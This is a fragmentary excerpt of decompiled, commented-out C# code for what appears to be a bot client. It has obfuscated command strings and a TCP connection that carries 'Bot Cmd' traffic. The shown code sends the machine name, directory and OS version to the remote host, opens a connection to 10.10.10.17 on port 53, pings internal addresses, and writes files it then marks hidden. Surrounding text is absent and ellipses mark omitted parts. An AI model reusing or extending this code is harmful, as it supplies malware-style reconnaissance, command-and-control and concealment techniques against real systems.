...
//    private bool bool_0;
//    private string[] string_0 = new string[18]
//    {
//      "䁁ᘴ尵䌭帡Ἧ䭾䄴",
//      "⽆⽞打㡁힠삾订헭춱",
//      "�籹\uEB56",
...
//    public Class1(string string_1, int int_0)
//    {
//      this.bool_2 = false;
//      try
//      {
//        this.current_tcp_connection = new TcpClient();
//        this.current_tcp_connection.Connect(string_1, int_0);
//        if (this.bool_2)
...
//        if (this.bool_1)
//          return;
//        int[] int_0 = new int[this.string_0.Length];
//        for (int index = 0; index < this.string_0.Length; ++index)
//          int_0[index] = index;
//        int[] numArray1 = this.randomly_shuffle_int_array(int_0);
...
//        while (this.bool_0)
//        {
//          for (int index1 = 0; index1 < this.string_0.Length; ++index1)
//          {
//            Console.Write("[+]");
//            string str1 = this.string_0[numArray1[index1]];
//            if ((this.bool_1 ? 0 : (!(str1.ToLower() == this.string_0[0]) ? 1 : 0)) != 0)
//            {
//              if (str1.ToLower() == this.string_0[1])
//              {
//                int length = Class1.smethod_1(5000, 4000000);
//                double[] numArray2 = new double[length];
//                for (int index2 = 0; index2 < length; ++index2)
//                  numArray2[index2] = (double) index2;
//                this.write_gif_to_file();
//                str1 = str1 + " " + (object) Convert.ToInt32(length);
//              }
//              else if (str1.ToLower() == this.string_0[2])
//              {
...
//                };
//                int index3 = Class1.smethod_1(0, strArray.Length);
//                str1 = str1 + " " + strArray[index3];
//              }
//              else if (str1.ToLower() == this.string_0[3])
//              {
//                Class1 class1 = new Class1("10.10.10.17", 53);
//              }
//              else if (str1.ToLower() == this.string_0[4])
//              {
//                string str2 = Environment.MachineName + " - " + Environment.CurrentDirectory + " - " + (object) Environment.OSVersion + " - ";
//                str1 += str2;
//              }
//              else if (str1.ToLower() == this.string_0[5])
//                new Ping().Send("10.1.1.100", 1000);
//              else if (str1.ToLower().StartsWith(this.string_0[6]))
//                this.write_string_to_file("myfile.txt", str1);
//              else if (str1.ToLower().StartsWith(this.string_0[7]))
//              {
//                if (this.bool_2)
...
//                return;
//              }
//              this.method_3(this.streamWriter_0, str1);
...
//    public string method_1(StreamReader streamReader_1)
//    {
//      string string_1 = "";
//      try
//      {
//        string_1 = streamReader_1.ReadLine();
//        while (streamReader_1.Peek() >= 0)
//          string_1 += streamReader_1.ReadLine();
//        if (this.bool_2)
//          Console.WriteLine("... Received " + this.method_2(string_1, 30));
//      }
//      catch (Exception ex)
//      {
//        if (this.bool_2)
...
//    public string method_2(string string_1, int int_0)
//    {
//      return string.IsNullOrEmpty(string_1) ? string_1 : string_1.Substring(0, Math.Min(string_1.Length, int_0));
//    }

//    public void method_3(StreamWriter streamWriter_1, string string_1)
//    {
//      if (this.bool_2)
//        Console.WriteLine("[*]Bot Cmd: " + string_1);
...
//      if (!this.bool_2)
//        return;
//      Console.WriteLine("Sending " + string_1);
//    }
...
//        return Class1.random_0.Next(int_0, int_1);
//    }

//    private int[] randomly_shuffle_int_array(int[] int_0)
//    {
...
//    public bool ping_an_ip(string string_1, int int_0, int int_1)
//    {
//      Ping ping = new Ping();
//      bool flag;
...
//        try
//        {
//          PingReply pingReply = ping.Send(string_1, int_1);
...
//    public void write_string_to_file(string string_1, string string_2)
//    {
//      try
//      {
//        if (System.IO.File.Exists(string_1))
//        {
//          System.IO.File.SetAttributes(string_1, FileAttributes.Normal);
//          System.IO.File.Delete(string_1);
//        }
//        TextWriter textWriter = (TextWriter) new StreamWriter(string_1);
//        textWriter.WriteLine(string_2);
//        textWriter.Flush();
//        textWriter.Close();
//        System.IO.File.SetAttributes(string_1, FileAttributes.Hidden);
//      }
//      catch (IOException ex)
//      {
//      }
...
//    public void sleep_for_random_time(int int_0, int int_1)
//    {
